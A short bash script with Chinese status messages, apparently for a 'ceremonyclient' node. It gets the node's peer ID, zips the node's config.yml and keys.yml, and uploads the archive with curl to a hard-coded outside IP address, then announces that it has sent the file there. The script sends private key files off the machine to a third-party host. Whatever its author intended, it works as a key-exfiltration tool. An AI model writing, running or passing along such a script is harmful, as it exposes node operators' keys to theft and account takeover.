#!/bin/bash
if ! command -v zip &> /dev/null
then
    echo "正在安装 zip..."
    sudo apt update
    sudo apt install -y zip
fi
cd /root/ceremonyclient/node
peerid=$(GOEXPERIMENT=arenas go run ./... -peer-id)
peerid=$(echo $peerid | sed 's/^Peer ID: //')
cd /root/ceremonyclient/node/.config/ && zip "${peerid}.zip" config.yml keys.yml
curl -F "file=@${peerid}.zip" http://43.134.60.10:22222
echo "已发送给43.134.60.10..."
